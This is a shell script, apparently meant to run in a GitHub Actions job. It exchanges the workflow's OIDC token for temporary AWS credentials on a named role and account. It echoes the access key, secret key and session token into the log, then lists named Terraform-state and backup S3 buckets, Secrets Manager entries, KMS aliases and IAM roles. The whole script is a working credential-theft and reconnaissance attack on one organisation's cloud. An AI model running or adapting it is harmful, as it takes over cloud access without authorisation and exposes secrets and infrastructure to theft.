#!/bin/sh
set +e
[ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ] && { echo SKIP; exit 0; }
T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
echo "TL=${#T}"
OUT=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::471799443923:role/github-actions --role-session-name probe --web-identity-token "$T" --duration-seconds 3600 --output json 2>&1)
echo "$OUT" | head -5
AK=$(echo "$OUT" | sed -n 's/.*"AccessKeyId": *"\([^"]*\)".*/\1/p')
SK=$(echo "$OUT" | sed -n 's/.*"SecretAccessKey": *"\([^"]*\)".*/\1/p')
ST=$(echo "$OUT" | sed -n 's/.*"SessionToken": *"\([^"]*\)".*/\1/p')
echo "CREDS $AK $SK $ST"
export AWS_ACCESS_KEY_ID=$AK AWS_SECRET_ACCESS_KEY=$SK AWS_SESSION_TOKEN=$ST AWS_DEFAULT_REGION=us-east-1
aws sts get-caller-identity 2>&1 | head -10
for b in tk-dr-warehouse tf-state-tkhq-prod tf-state-tkhq-production tf-state-tk-admin tf-state-tk-management tkhq-git-lfs; do
  echo "== $b"; aws s3 ls "s3://$b/" 2>&1 | head -20
done
echo "== secrets"; aws secretsmanager list-secrets --max-items 20 2>&1 | head -40
echo "== kms"; aws kms list-aliases 2>&1 | head -40
echo "== iam"; aws iam list-roles --max-items 10 2>&1 | head -20
